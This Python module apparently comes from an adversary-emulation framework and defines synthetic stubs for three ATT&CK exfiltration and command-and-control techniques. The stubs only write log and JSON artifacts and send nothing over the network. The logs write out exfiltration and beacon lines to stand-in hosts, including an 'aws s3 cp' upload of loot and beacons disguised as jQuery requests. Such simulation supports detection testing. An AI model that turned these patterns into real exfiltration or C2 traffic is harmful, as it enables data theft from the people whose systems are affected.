"""Exfiltration + C2 stubs - all writes synthetic, no network egress."""
from __future__ import annotations
import json
import os
from typing import Any, Dict, Optional

from .base import Evidence, TacticPhase, Technique


class T1041_ExfilC2Channel(Technique):
    technique_id = "T1041"
    tactic = TacticPhase.EXFILTRATION
    name = "Exfiltration Over C2 Channel"
    description = "Synthetically record an exfiltration event - DOES NOT send network traffic."

    def run(self, *, workdir: str,
              parameters: Optional[Dict[str, Any]] = None) -> Evidence:
        params = parameters or {}
        target_host = str(params.get("target_host", "loot.example.invalid"))
        bytes_out = int(params.get("bytes", 1024))
        ev = Evidence()
        out = self._safe_join(workdir, "exfil_event.json")
        with open(out, "w") as f:
            json.dump({
                "destination": target_host, "bytes_sent": bytes_out,
                "protocol": "https", "synthetic": True,
            }, f)
        ev.add_artifact("network", "exfil_event",
                          destination=target_host, bytes=bytes_out,
                          protocol="https", synthetic=True)
        ev.add_log(f"{self._ts()} NETWORK conn-out POST https://{target_host}/upload "
                     f"({bytes_out}B) [SYNTHETIC]")
        return ev


class T1071_001_WebProtocols(Technique):
    technique_id = "T1071.001"
    tactic = TacticPhase.COMMAND_AND_CONTROL
    name = "Application Layer Protocol -- Web Protocols"
    description = "Synthetically log a beacon callout."

    def run(self, *, workdir: str,
              parameters: Optional[Dict[str, Any]] = None) -> Evidence:
        params = parameters or {}
        c2 = str(params.get("c2_host", "cdn.example.invalid"))
        interval_s = int(params.get("interval_s", 60))
        ev = Evidence()
        out = self._safe_join(workdir, "beacons.log")
        with open(out, "w") as f:
            for i in range(3):
                f.write(f"{self._ts()}  GET https://{c2}/jquery-3.{i}.min.js  -> 200\n")
        ev.add_artifact("network", "beacon", c2_host=c2,
                          interval_s=interval_s, samples=3, synthetic=True)
        ev.add_log(f"{self._ts()} NETWORK beacon GET https://{c2}/... every {interval_s}s [SYNTHETIC]")
        return ev


class T1567_002_ExfilToCloud(Technique):
    technique_id = "T1567.002"
    tactic = TacticPhase.EXFILTRATION
    name = "Exfiltration to Cloud Storage"
    description = "Synthetic upload to a cloud bucket name."

    def run(self, *, workdir: str,
              parameters: Optional[Dict[str, Any]] = None) -> Evidence:
        params = parameters or {}
        bucket = str(params.get("bucket", "synthetic-loot"))
        ev = Evidence()
        ev.add_artifact("network", "cloud_exfil", bucket=bucket, synthetic=True)
        ev.add_log(f"{self._ts()} NETWORK aws s3 cp loot s3://{bucket}/ [SYNTHETIC]")
        return ev
